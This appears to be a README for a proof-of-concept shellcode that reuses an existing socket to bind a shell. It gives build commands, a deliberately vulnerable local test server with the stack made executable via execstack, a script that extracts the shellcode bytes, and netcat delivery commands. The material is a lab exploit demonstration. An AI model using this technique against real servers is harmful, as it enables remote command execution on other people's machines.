RSS : Reused Socket Shell

This is a proof of concept of a shellcode that reuse an existing socket to bind a shell on it

I've made two versions of this, the first one (shellcode.s) just check for the last opened file descriptor and gives you the shell though it. Wether it is your socket or not. This method should work on a server that fork() for each client and wich didn't open something after the socket was accepted.
The second version loops through the filedescriptors ; and make a call to recvfrom() for each one of theses. If it gets the good data, it will drop the shell. Otherwise, nothing happen it'll just check for the next socket.

To compile it use :

   ```
   nasm -o shellcode.o -felf64 shellcode.s
   ```

To link it (that step should not be necessary) :

   ```
   ld -o shellcode shellcode.o
   ```

For the test server, you should :

Compile it with gcc:

   ```
   gcc -o server serv_test.c
   ```

And then you should run execstack, wich will allow code execution on the stack. This is needed because we store the user's buffer in an array on the stack, and then execute it. Execstack should be one your repository :

   ```
   apt-get install execstack
   ```

And then run:
   
   ```
   execstack -s ./server
   ```

When you've done all of this, you can run the server.
And to get the shellcode, I use the command line (thanks to http://www.commandlinefu.com for that) in a script (I called it 'getsc') :

    #!/bin/sh
    for i in $(objdump -d $1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo

For testing, we will use this :

    (echo -ne `getsc shellcode` ; cat) | nc localhost 1024

And for our shellcode V2, we will need to give it the pattern to match, so let's use this :

    (echo -ne `getsc shellcode` ; echo -n BBBB ;  cat) | nc localhost 1024
    
Using cat allow us to run commands after the shellcode get executed; we wouldn't have a user input otherwise.
